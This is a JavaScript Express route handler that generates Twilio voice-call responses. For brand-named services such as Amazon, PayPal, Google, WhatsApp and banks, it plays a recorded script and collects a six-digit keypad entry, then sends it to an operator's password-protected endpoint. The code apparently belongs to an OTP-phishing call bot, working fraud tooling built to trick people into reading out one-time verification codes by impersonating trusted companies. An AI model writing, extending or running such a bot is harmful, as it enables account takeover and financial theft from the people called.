/**
 * Voice route handler for generating TwiML responses
 */

const express = require('express');
const twilio = require('twilio');
const VoiceResponse = twilio.twiml.VoiceResponse;
const config = require('../config');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

// Initialize database
const db = new sqlite3.Database(path.join(__dirname, '../db/database.db'));

/**
 * Voice handler for generating TwiML responses
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 */
const voiceHandler = (req, res) => {
  try {
    // Extract service from query parameters
    const { service } = req.query;
    
    // Create a new TwiML response
    const twiml = new VoiceResponse();
    
    // Check if this is a custom script
    if (service && !['amazon', 'cdiscount', 'twitter', 'whatsapp', 'paypal', 'google', 'snapchat', 'instagram', 'facebook', 'banque', 'default'].includes(service)) {
      // Check if the service exists in the config
      const configKey = `${service.toLowerCase()}filepath`;
      
      if (config[configKey]) {
        // This is a custom script that's in the config
        const gather = twiml.gather({
          input: 'dtmf',
          timeout: 10,
          numDigits: 6,
          action: `${config.serverurl}/status/${config.apipassword}?service=${service}`,
          method: 'POST'
        });
        
        // Play the custom script audio
        gather.play(`${config.serverurl}/stream/${service}`);
        
        // If no input is received, repeat the message
        twiml.redirect(`${config.serverurl}/voice/${config.apipassword}?service=${service}`);
      } else {
        // Check if this is a script in the database
        db.get('SELECT * FROM scripts WHERE name = ? AND type = ?', [service, 'call'], (err, row) => {
          if (err || !row) {
            // If script not found, use default
            const gather = twiml.gather({
              input: 'dtmf',
              timeout: 10,
              numDigits: 6,
              action: `${config.serverurl}/status/${config.apipassword}?service=default`,
              method: 'POST'
            });
            
            gather.play(`${config.serverurl}/stream/default`);
            twiml.redirect(`${config.serverurl}/voice/${config.apipassword}?service=default`);
          } else {
            // Script found, use it
            const gather = twiml.gather({
              input: 'dtmf',
              timeout: 10,
              numDigits: 6,
              action: `${config.serverurl}/status/${config.apipassword}?service=${service}`,
              method: 'POST'
            });
            
            gather.play(`${config.serverurl}/stream/${service}`);
            twiml.redirect(`${config.serverurl}/voice/${config.apipassword}?service=${service}`);
          }
          
          // Send the TwiML response
          res.type('text/xml');
          res.send(twiml.toString());
        });
        
        return; // Return early as we're handling the response in the callback
      }
    } else {
      // This is a standard service
      const gather = twiml.gather({
        input: 'dtmf',
        timeout: 10,
        numDigits: 6,
        action: `${config.serverurl}/status/${config.apipassword}?service=${service || 'default'}`,
        method: 'POST'
      });
      
      // Play the appropriate audio file
      gather.play(`${config.serverurl}/stream/${service || 'default'}`);
      
      // If no input is received, repeat the message
      twiml.redirect(`${config.serverurl}/voice/${config.apipassword}?service=${service || 'default'}`);
    }
    
    // Send the TwiML response
    res.type('text/xml');
    res.send(twiml.toString());
  } catch (error) {
    console.error('Error in voice handler:', error);
    
    // Create a simple response in case of error
    const twiml = new VoiceResponse();
    twiml.say('An error occurred. Please try again later.');
    
    res.type('text/xml');
    res.send(twiml.toString());
  }
};

module.exports = voiceHandler;
